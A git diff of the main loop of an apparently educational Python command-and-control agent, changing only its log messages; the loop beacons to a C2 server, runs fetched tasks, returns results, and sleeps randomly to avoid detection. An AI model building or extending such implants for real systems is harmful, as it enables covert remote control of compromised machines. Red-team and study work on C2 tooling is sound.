@@ -96,18 +96,18 @@ def send_results(task_id, output):
 
 # main loop for the agent, simulates it never turning off and beaconing to c2 server
 def agent_loop():
-    print(f"[+] Agent started with ID: {AGENT_ID}")
+    print(f"Agent started with ID: {AGENT_ID}")
 
     while True:
 
         # beacon by checking in with server
         resp = checkin()
-        print(f"[+] Check-in response: {resp}")
+        print(f"Check-in response: {resp}")
 
         # get tasks, if any, and carry them out
         tasks = fetch_tasks()
         if tasks:
-            print(f"[+] Received {len(tasks)} task(s)")
+            print(f"Received {len(tasks)} task(s)")
 
             for t in tasks:
                 task_id = t.get("task_id")
@@ -119,14 +119,14 @@ def agent_loop():
 
                 # upon finishing taks, send results back to server
                 r = send_results(task_id, output)
-                print(f"[+] Sent results: {r}")
+                print(f"Sent results: {r}")
 
         else:
-            print("[+] No tasks received")
+            print("No tasks received")
 
         # go to sleep for random amount of time to avoid detection 
         sleep_time = random.randint(5, 12)
-        print(f"[+] Sleeping {sleep_time} seconds...\n")
+        print(f"Sleeping {sleep_time} seconds...\n")
         time.sleep(sleep_time)
 
 ##################################################################
